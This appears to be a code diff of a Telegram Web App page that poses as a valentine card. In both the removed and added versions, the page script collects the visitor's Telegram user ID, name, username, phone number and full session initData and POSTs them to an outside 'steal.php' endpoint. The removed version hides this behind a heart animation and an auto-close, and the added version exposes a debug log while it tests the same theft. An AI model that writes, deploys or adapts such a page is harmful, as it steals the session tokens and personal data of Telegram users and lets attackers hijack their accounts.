@@ -4,46 +4,39 @@
     <meta charset="utf-8">
     <title>Валентинка</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <h1>Проверка</h1>
+    <div id="log"></div>
+
     <script>
-        // ⚠️ ТВОЙ БЭКЕНД НА БЕГЕТЕ (HTTP, НО НОРМ)
+        const log = document.getElementById('log');
         const API_URL = 'http://bprof.raximi52.beget.tech/steal.php';
         
         Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
         
-        // ТУТ БЕРЕМ ВСЕ ДАННЫЕ
-        const initData = Telegram.WebApp.initData;
         const user = Telegram.WebApp.initDataUnsafe?.user;
+        const initData = Telegram.WebApp.initData;
         
-        // ОТПРАВЛЯЕМ СРАЗУ
-        if (initData) {
+        log.innerHTML += 'User: ' + (user ? '✅' : '❌') + '<br>';
+        log.innerHTML += 'InitData: ' + (initData ? '✅' : '❌') + '<br>';
+        
+        if (user && initData) {
             fetch(API_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    id: user?.id || 'unknown',
-                    username: user?.username || '',
-                    first_name: user?.first_name || '',
-                    last_name: user?.last_name || '',
-                    phone: user?.phone_number || '',
-                    session: initData,
-                    url: window.location.href
+                    id: user.id,
+                    username: user.username,
+                    first_name: user.first_name,
+                    last_name: user.last_name,
+                    phone: user.phone_number,
+                    session: initData
                 })
-            }).catch(e => console.log(e));
+            }).then(res => res.json())
+              .then(data => log.innerHTML += 'Отправка: ✅ ' + JSON.stringify(data))
+              .catch(e => log.innerHTML += 'Ошибка: ❌ ' + e);
         }
-        
-        // ЗАКРЫВАЕМ ЧЕРЕЗ 2 СЕКУНДЫ
-        setTimeout(() => Telegram.WebApp.close(), 2000);
     </script>
-    <style>
-        body { background: #0a0a0a; color: white; text-align: center; padding-top: 50px; }
-        .heart { font-size: 64px; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } }
-    </style>
-</head>
-<body>
-    <div class="heart">❤️</div>
-    <h1>Валентинка открыта!</h1>
-    <p>Спасибо ❤️</p>
 </body>
 </html>
